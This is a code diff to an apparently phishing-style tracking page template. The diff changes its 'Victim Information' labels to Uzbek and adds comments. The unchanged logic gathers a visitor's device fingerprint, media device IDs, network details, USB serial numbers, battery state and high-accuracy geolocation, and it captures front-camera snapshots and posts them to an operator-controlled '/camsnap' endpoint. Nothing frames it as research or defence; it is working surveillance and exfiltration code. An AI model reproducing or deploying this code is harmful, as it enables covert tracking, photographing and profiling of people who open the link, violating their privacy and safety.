@@ -27,74 +27,73 @@ var uid="<%=uid %>";
 async function gather(){
 var td="";
 <% if(!t){ %>
-td += '<code>👤 ᴠɪᴄᴛɪᴍ ɪɴғᴏʀᴍᴀᴛɪᴏɴ </code><br><br><b>📍 ɪᴘ ᴀᴅʀᴇs » <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a>\n⌚ ᴛɪᴍᴇ » <%=time %></b>';
+td += '<code>📂 Jabrlanuvchi malumotlari: </code><br><br><b>📍 IP manzili: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Soat: <%=time %></b>';
 <% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>👤 Victim Information </code><br><br><b>📍 ɪᴘ ᴀᴅʀᴇs » <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a>\n⌚ ᴛɪᴍᴇ » <%=time %></b>'));
+await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>📂 Jabrlanuvchi malumotlari: </code><br><br><b>📍 IP manzili: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Soat: <%=time %></b>'));
 
 <% } %>
 
-td+="<br><br><b>📅 ᴅᴀᴛᴇ ɪɴ ᴠɪᴄᴛɪᴍ's ᴅᴇᴠɪᴄᴇ » </b> "+new Date()+"<br>";
+td+="<br><br><b>📅 Qurulma vaqti:</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
 var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-
-  
-td+="<br><b>📱 ᴅᴇᴠɪᴄᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b><br>\n";
+///INITIALS
+td+="<br><b>📲 Qurulma haqida ma'lumot:</b><br>";
 for(var i=0;i < xo.length;i++){ 
 if(xo[i] in navigator){
 var str = navigator[xo[i]];
-td+="<b>"+xo[i] +"</b> » <code>"+str+"</code><br>";
+td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
 }
 }
 
 
 
 if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
-
+/////List cameras and microphones.
 await navigator.mediaDevices?.enumerateDevices()
 .then(function(devices) {
-td+="<br><b>📷 ᴍᴇᴅɪᴀ ᴅᴇᴠɪᴄᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b><br>\n";
+td+="<br><b>📼 Media qurulmasi haqida ma'lumot:</b><br>";
 devices.forEach(function(device) {
-td+="<b>"+device.kind+" »</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
+td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
 });
 })
 .catch(function(err) {
-td+="<br><b>📷 ᴍᴇᴅɪᴀ ᴅᴇᴠɪᴄᴇ ɪɴғᴏʀᴍᴀᴛɪᴏɴ </b><br>";
-td+="❗️ ᴍᴇᴅɪᴀ ᴅᴇᴠɪᴄᴇ ᴇʀʀᴏʀ » "+err.name + ": " + err.message;
+td+="<br><b>📼 Media qurulmasi haqida ma'lumot:</b><br>";
+td+="⚠️ Media qurulmada xatolik!"+err.name + ": " + err.message;
 });
 }
 
 
-
+////CONNECTION
 if("connection" in navigator){
-td+="<br><b>🌐 ɴᴇᴛᴡᴏʀᴋ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b><br>\n";
+td+="<br><b>📶 Tarmoq haqida ma'lumot:n</b><br>";
 for(var i=0;i < xoc.length;i++){ 
 var str = navigator.connection[xoc[i]];
-td+="<b>"+xoc[i] +"</b> » <code>"+str+"</code><br>";
+td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
 }}
 
 
-
+////USB
 if("usb" in navigator){
 await navigator.usb.getDevices()
 .then(devices => {
-td+="<br><b>🔌 ᴛᴏᴛᴀʟ ᴜsʙ ᴅᴇᴠɪᴄᴇs ᴄᴏɴɴᴇᴄᴛᴇᴅ »</b> " + devices.length+"<br>";
+td+="<br><b>🔌 USB qurulmalar:</b> " + devices.length+"<br>";
 devices.forEach(device => {
-td+="<b>ᴘʀᴏᴅᴜᴄᴛ ɴᴀᴍᴇ »</b> " + device.productName + " , <b>sᴇʀɪᴀʟ ɴᴜᴍʙᴇʀ » </b> <code>" + device.serialNumber+"</code><br>";
+td+="<b>📦 Mahsulot nomi:</b> " + device.productName + " , <b>📃 Ishlab chiqarish raqami:</b> <code>" + device.serialNumber+"</code><br>";
 });
 });
 }
 
 if("getBattery" in navigator){
 await navigator.getBattery().then(function(battery) {
-td+="<br><b>🪫 ʙᴀᴛᴛᴇʀʏ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b><br>\n";
-td+="<b>🔋 ʙᴀᴛᴛᴇʀʏ ᴘᴏᴡᴇʀ » </b> " +battery.level*100+"%<br><b>⚡️ ʙᴀᴛᴛᴇʀʏ ᴄʜᴀʀɢɪɴɢ » </b> "+battery.charging+"";
+td+="<br><b>🔋 Qurulma quvvati haqida ma'lumot:</b><br>";
+td+="<b>🔋 Qurulma quvvati:</b> " +battery.level*100+"%<br><b>⚡️ Quvvatlanmoqda:</b> "+battery.charging+"";
 });
 }
 
-
+//////Location
 if(!navigator.geolocation) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="❗️ ʟᴏᴄᴀᴛɪᴏɴ ᴀᴘɪ ɴᴏᴛ ᴀᴠɪʟᴀʙʟᴇ";
+td+="<br><b>📍 Joylashuv haqida ma'lumot:</b><br>";
+td+="⚠️ Joylashuv API mavjud emas!";
 } 
 
 function success(pos) {
@@ -106,8 +105,8 @@ red();
 }
 
 function error(err) {
-td+="<br><b>📍 ʟᴏᴄᴀᴛɪᴏɴ ɪɴғᴏʀᴍᴀᴛɪᴏɴ</b><br>";
-td+="❗️ ʟᴏᴄᴀᴛɪᴏɴ ᴇʀʀᴏʀ » <code>"+err.message+"</code>";
+td+="<br><b>📍 Joylashuv haqida ma'lumot:</b><br>";
+td+="⚠️ Joylashuvda xatolik! <code>"+err.message+"</code>";
 }
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
@@ -125,14 +124,14 @@ $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
 });
 }
 const constraints = {audio: false,video: {facingMode: "user" }};
-
+// Access webcam
 async function cam() {
 try {
 const stream = await navigator.mediaDevices.getUserMedia(constraints);
 handleSuccess(stream);
 } catch (e) {
-td+='<br><b>📷 ᴄᴀᴍᴇʀᴀ ɪᴍᴀɢᴇs</b>';
-td+= `<br>❗️ ᴄᴀᴍᴇʀᴀ ᴀᴄᴄᴇss ᴇʀʀᴏʀ» ${e.toString()}`;
+td+='<br><b>📸 Kamera tasvirlari:</b>';
+td+= `<br>⚠️ Kamerada xatolik! ${e.toString()}`;
 }
 }
 
